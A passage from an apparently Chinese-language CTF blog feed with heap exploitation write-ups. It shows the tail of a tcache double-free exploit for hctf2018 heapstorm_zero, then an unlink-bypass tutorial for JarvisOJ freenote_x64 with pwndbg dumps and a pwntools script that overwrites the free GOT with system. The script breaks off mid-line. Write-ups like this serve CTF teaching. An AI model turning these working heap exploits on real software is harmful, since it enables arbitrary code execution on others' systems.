class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">8</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line"></span><br><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 chunk 8, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0xe42ee</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发 free_hook</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>参考<br><a href="https://www.cnblogs.com/hac425/p/9993716.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9993716.html</a><br><a href="https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py</a><br><a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。&lt;/p&gt;
&lt;p&gt;题目
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="https://nocbtm.github.io/2020/02/27/unlink/"/>
    <id>https://nocbtm.github.io/2020/02/27/unlink/</id>
    <published>2020-02-27T06:38:52.000Z</published>
    <updated>2020-04-08T14:04:21.111Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个smallchunk的时候，如果它前面或者后面的chunk有空闲的，即in_use位为0时，就将前面或后面的chunk连在一起合成一个chunk;<br>smallbin的数据结构：prev_size,size,fd,bk;<br>因为smallbin被释放后是用双链串在一起的，这就使目前unlink操作时，有一定的检查机制，主要检查我们的双链是否是合法的；<br>主要检查fd,bk等指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure></p><p>在双向链表中，所以有两个地方记录chunk的大小，所以检查一下其大小是否一致：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure><p>unlink操作的简要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD)</span></span><br><span class="line">&#123;</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span>(FD-&gt;bk != P || BK-&gt;fd !=p)</span><br><span class="line">    &#123;</span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted d..."</span>, P);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>实际上，我们还是有办法绕过unlink的检查，不过需要有一些条件：</p><ol><li>有一个指向heap内的指针；</li><li>存放这个指针的地址已知(一般这个地址(&amp;p)是全局变量)；</li><li>可以对这个指针进行多次写入；</li><li>然后我们想办法修改p的fd和p的bk分别为:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">0x18</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">0x10</span>; <span class="comment">//bk</span></span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">12</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">8</span>; <span class="comment">//bk</span></span><br></pre></td></tr></table></figure><p>这样我们就可以绕过(FD-&gt;bk != P || BK-&gt;fd !=p)检测了，当unlink的操作完了之后，我们得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p = &amp;p - <span class="number">0x18</span>；</span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p = &amp;p - <span class="number">12</span>;</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我们以JarvisOJ中的freenote_x64来具体演示一下绕过unlink的操作并且熟悉一下smallbin的结构；<br>这道题在add函数和edit函数中，真实malloc的size最小都是0x80，也就是我们申请的是smallbin,所以操作的也是samllbin；<br>主要漏洞在delete note里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunk_list-&gt;number &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No posts yet."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Post number: "</span>);</span><br><span class="line">    i = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> &amp;&amp; i &lt; chunk_list-&gt;sum )        <span class="comment">// 未检查inuse位，double_free</span></span><br><span class="line">    &#123;</span><br><span class="line">      --chunk_list-&gt;number;</span><br><span class="line">      chunk_list-&gt;block[i].in_use = <span class="number">0L</span>L;</span><br><span class="line">      chunk_list-&gt;block[i].len = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(chunk_list-&gt;block[i].ptr);           <span class="comment">// 指针未清空</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个有用的漏洞就是add和edit时，我们输入的字符串没有‘\x00’结尾符，我们输入多大的size就读多少size的字符，没有多余；</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>所以基本思路就是我们先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;<br>在heap基地址偏移0x30的地方有我们需要的&amp;p:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000001 0x0000000000000004</span><br><span class="line">0x603030:&amp;p0x0000000000604830 p 0x0000000000000001</span><br><span class="line">0x603040:0x0000000000000002 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>有了&amp;p之后我们就可以构造chunk，然后unlink了；<br>unlink之后的&amp;p,此时p=&amp;p-0x18:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:0x0000000000000000 0x0000000000001821</span><br><span class="line">0x603010:0x0000000000000100 0x0000000000000004</span><br><span class="line">0x603020:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603030:0x0000000000603018 p 0x0000000000000001 //p=&amp;p-0x18</span><br><span class="line">0x603040:0x0000000000000008 0x00000000006048c0</span><br><span class="line">0x603050:0x0000000000000001 0x0000000000000001</span><br><span class="line">0x603060:0x0000000000604950 0x0000000000000001</span><br><span class="line">0x603070:0x0000000000000004 0x00000000006049e0</span><br><span class="line">0x603080:0x0000000000000000 0x0000000000000000</span><br><span class="line">0x603090:0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>然后现在我们就可以修改0x0603018地址开始的内容了，然后就可以修改指针达到任意地址写入了；</p><h3 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h3><p>伪造的如下三个堆块结构 ，注意chunk前后的size一定要相对应<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x17b8820</span><br><span class="line">0x17b8820:0x00000000000000000x0000000000000191</span><br><span class="line">0x17b8830:0x00000000000000900x0000000000000081</span><br><span class="line">0x17b8840:0x00000000017b70180x00000000017b7020</span><br><span class="line">0x17b8850:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8860:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8870:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8880:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b8890:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x17b88b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x17b88c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b88f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8900:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8910:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8920:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8930:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8940:0x00000000000000900x0000000000000121</span><br><span class="line">0x17b8950:0x32323232323232320x00007f61721feb78</span><br><span class="line">0x17b8960:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8970:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8980:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b8990:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x17b89c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x17b89d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x17b89e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b89f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a00:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a10:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a20:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a30:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a40:0x64646464646464640x6464646464646464</span><br><span class="line">0x17b8a50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>free(1)之后，堆块的结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80xg 0x11dd820</span><br><span class="line">0x11dd820:0x00000000000000000x0000000000000191</span><br><span class="line">0x11dd830:0x00000000000000900x0000000000000111</span><br><span class="line">0x11dd840:0x00007fc6bdb86b780x00007fc6bdb86b78</span><br><span class="line">0x11dd850:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd860:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd870:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd880:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd890:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x11dd8b0:0x00000000000000800x0000000000000090</span><br><span class="line">0x11dd8c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8d0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd8f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd900:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd910:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd920:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd930:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd940:0x00000000000001100x0000000000000120</span><br><span class="line">0x11dd950:0x32323232323232320x00007fc6bdb86b78</span><br><span class="line">0x11dd960:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd970:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd980:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd990:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9b0:0x63636363636363630x0000000000020651</span><br><span class="line">0x11dd9c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x11dd9d0:0x00000000000001200x0000000000000090</span><br><span class="line">0x11dd9e0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dd9f0:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda00:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda10:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda20:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda30:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda40:0x64646464646464640x6464646464646464</span><br><span class="line">0x11dda50:0x64646464646464640x6464646464646464</span><br></pre></td></tr></table></figure></p><p>而目标地址已经被修改为 p=&amp;p-0x18<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x11dc000</span><br><span class="line">0x11dc000:0x00000000000000000x0000000000001821</span><br><span class="line">0x11dc010:0x00000000000001000x0000000000000000</span><br><span class="line">0x11dc020:0x00000000000000010x0000000000000120</span><br><span class="line">0x11dc030:0x00000000011dc0180x0000000000000000  //p=&amp;p-0x18</span><br><span class="line">0x11dc040:0x00000000000000000x00000000011dd8c0</span><br><span class="line">0x11dc050:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc060:0x00000000011dd9500x0000000000000000</span><br><span class="line">0x11dc070:0x00000000000000000x00000000011dd9e0</span><br><span class="line">0x11dc080:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc090:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc0f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc100:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc110:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc120:0x00000000000000000x0000000000000000</span><br><span class="line">0x11dc130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>接下来向 chunk0 里面写内容就相当于控制了chunk list，随便修改东西，这里把free_got覆盖为system</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./freenote_x64'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29050</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./freenote_x64'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Length of new note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Length of note: '</span>)</span><br><span class="line">p.sendline(str(len(cont)))</span><br><span class="line">p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">p.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'c'</span>*<span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'d'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="string">'11111111'</span>)</span><br><span class="line">new(<span class="string">'22222222'</span>)</span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'11111111'</span>)</span><br><span class="line">s=p.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">chunk2=u64(s[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr=chunk2<span class="number">-0x1940</span></span><br><span class="line">point_chunk0=heap_addr+<span class="number">0x30</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">payload = p64(<span class="number">0x90</span>)+p64(<span class="number">0x81</span>)+p64(point_chunk0<span class="number">-0x18</span>)+p64(point_chunk0<span class="number">-0x10</span>) </span><br><span class="line">payload +=<span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload +=<span class="string">'c'</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x121</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#free_got-&gt;system</span></span><br><span class="line">free_got_addr=e.got[<span class="string">'free'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(free_got_addr)</span><br><span class="line">payload2=p64(<span class="number">4</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(free_got_addr)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(chunk2)</span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">'atoi'</span>])</span><br><span class="line">payload2+=<span class="string">'\x00'</span>*(<span class="number">0x120</span><span class="number">-80</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: Invalid!\n'</span>)</span><br><span class="line"></span><br><span class="line">List()</span><br><span class="line">p.recvuntil(<span class="string">'2. '</span>)</span><br><span class="line">atoi_in_server=u64(p.recvuntil(<span 